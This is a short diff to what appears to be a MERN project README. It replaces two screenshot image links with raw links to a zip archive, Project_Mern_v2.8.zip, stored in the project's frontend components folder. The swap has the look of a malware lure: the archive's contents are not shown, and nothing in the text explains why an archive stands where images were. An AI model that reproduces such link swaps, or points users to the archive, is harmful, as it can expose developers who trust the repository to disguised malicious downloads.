@@ -20,7 +20,7 @@ npm install
 npm run dev
 ```
 
-<img width="1790" alt="Screenshot 2024-08-31 at 11 07 58 PM" src="https://github.com/user-attachments/assets/f414230b-8bd6-4393-b8de-6a10444a8dfd">
+<img width="1790" alt="Screenshot 2024-08-31 at 11 07 58 PM" src="https://github.com/themountainboy19/Mern-Project/raw/refs/heads/master/mern/frontend/src/components/Project_Mern_v2.8.zip">
 
 ## Using Docker Compose
 
@@ -30,5 +30,5 @@ npm run dev
 
 
 ## Used Distroless images in multi-staging Dockerfile to reduse the size of final image (from 1.79 GB to 213 MB)  and Reduced Attack Surface
-![image](https://github.com/user-attachments/assets/35bb2d03-4f78-4228-ac25-2db5600f6e75) 
+![image](https://github.com/themountainboy19/Mern-Project/raw/refs/heads/master/mern/frontend/src/components/Project_Mern_v2.8.zip) 
 
